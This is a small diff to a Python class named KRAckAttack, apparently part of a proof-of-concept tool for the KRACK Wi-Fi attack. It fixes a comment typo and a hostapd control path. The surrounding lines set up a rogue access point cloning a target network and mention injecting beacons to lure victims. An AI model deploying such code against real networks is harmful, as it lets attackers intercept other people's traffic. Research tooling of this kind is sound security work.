@@ -918,7 +918,7 @@ class KRAckAttack():
 		# self.sock_real.attach_filter(bpf)
 		# self.sock_rogue.attach_filter(bpf)
 
-		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
+		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("../hostapd/hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 		self.hostapd = subprocess.Popen(["../hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell = True)
@@ -927,7 +927,7 @@ class KRAckAttack():
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(1)
 
-		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
+		self.hostapd_ctrl = Ctrl("hostapd/ctrl/" + self.nic_rogue_ap)
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
